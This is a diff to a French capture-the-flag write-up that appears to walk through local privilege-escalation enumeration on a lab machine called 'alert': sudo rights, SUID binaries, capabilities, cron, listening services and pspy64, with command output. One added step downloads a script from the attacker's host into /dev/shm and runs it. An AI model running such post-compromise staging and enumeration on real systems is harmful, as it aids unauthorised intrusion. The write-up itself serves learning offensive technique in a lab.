@@ -969,6 +969,14 @@ Tu peux maintenant passer à l’énumération locale afin d’identifier des ve
 ### Sudo -l
 Tu commences toujours par vérifier les droits sudo :
 
+```bash
+albert@alert:~$ sudo -l
+[sudo] password for albert: 
+Sorry, user albert may not run sudo on alert.
+```
+
+L’utilisateur `albert` ne dispose d’aucun droit `sudo`.
+
 ### Recherche de binaires SUID
 Tu poursuis l’énumération en recherchant les **binaires SUID**, qui permettent parfois d’exécuter certaines commandes avec les privilèges de leur propriétaire.
 
@@ -984,6 +992,7 @@ La liste obtenue ne contient que des binaires système classiques tels que :
 /usr/bin/chfn
 /usr/bin/sudo
 /usr/bin/newgrp
+...
 ```
 
 Tu n’identifies aucun binaire inhabituel ou directement exploitable.
@@ -998,9 +1007,57 @@ La vérification se fait avec la commande suivante :
 getcap -r / 2>/dev/null
 ```
 
-Ici, tu ne trouves aucune capability inhabituelle ni aucun binaire exploitable.
+```bash
+/usr/bin/traceroute6.iputils = cap_net_raw+ep
+/usr/bin/mtr-packet = cap_net_raw+ep
+/usr/bin/ping = cap_net_raw+ep
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
+```
+
+Les capabilities identifiées sont classiques :
+
+- `cap_net_raw` → utilisé pour envoyer des paquets réseau (ping, traceroute…)
+- `cap_net_bind_service` → permet de binder des ports < 1024
+- `cap_net_admin` → gestion réseau avancée
+
+Ces capacités sont normales dans ce contexte et ne fournissent **aucune piste exploitable directe** pour une élévation de privilèges.
+
+### Vérification des SUID avec suid3num.py
+
+Pour compléter l’analyse des binaires SUID, tu utilises l’outil `suid3num.py`, qui permet d’identifier rapidement :
+
+- les binaires SUID intéressants
+- leur présence éventuelle dans GTFOBins
+
+Tu le télécharges et l’exécutes depuis un répertoire en mémoire (`/dev/shm`) :
+
+```bash
+cd /dev/shm
+wget http://10.10.x.x:8000/suid3num.py
+python3 suid3num.py
+```
+
+L’outil confirme que :
+
+- tous les binaires SUID présents sont **standards**
+- aucun binaire personnalisé n’est identifié
+- aucun binaire exploitable via GTFOBins n’est détecté
+
+```bash
+[~] Custom SUID Binaries (Interesting Stuff)
+------------------------------
+------------------------------
+
+[#] SUID Binaries found in GTFO bins..
+------------------------------
+[!] None :(
+------------------------------
+```
+
+
 
 ### Inspection des tâches cron
+
 Tu vérifies ensuite les **tâches planifiées (cron)**, car certains scripts exécutés automatiquement par le système peuvent être modifiables par un utilisateur et permettre une élévation de privilèges.
 
 Les crons système peuvent être consultés avec :
@@ -1009,14 +1066,50 @@ Les crons système peuvent être consultés avec :
 cat /etc/crontab
 ```
 
+On retrouve ici uniquement les tâches cron système classiques :
+
+- exécution des scripts horaires dans `/etc/cron.hourly`
+- exécution des scripts quotidiens dans `/etc/cron.daily`
+- exécution des scripts hebdomadaires dans `/etc/cron.weekly`
+- exécution des scripts mensuels dans `/etc/cron.monthly`
+
+À ce stade, rien d’anormal n’apparaît dans ce fichier.
+
+Tu ne vois pas de commande personnalisée, ni de script manifestement exploitable par l’utilisateur `albert`.
+
 ### Analyse des services locaux
+
 Tu vérifies ensuite les **services en cours d’exécution**, ce qui permet parfois d’identifier une application vulnérable ou un service mal configuré.
 
 ```
 netstat -tulpn
 ```
 
+Résultat :
+
+```bash
+netstat -tulpn
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::80                   :::*                    LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
+udp        0      0 0.0.0.0:68              0.0.0.0:*                           -         
+```
+
+
+
+
+
+
+
 ### pspy64
+
 Tu lances également pspy64 dans une deuxième session SSH afin d’observer en temps réel les processus exécutés sur la machine, notamment ceux lancés par root.
 
 cd /tmp
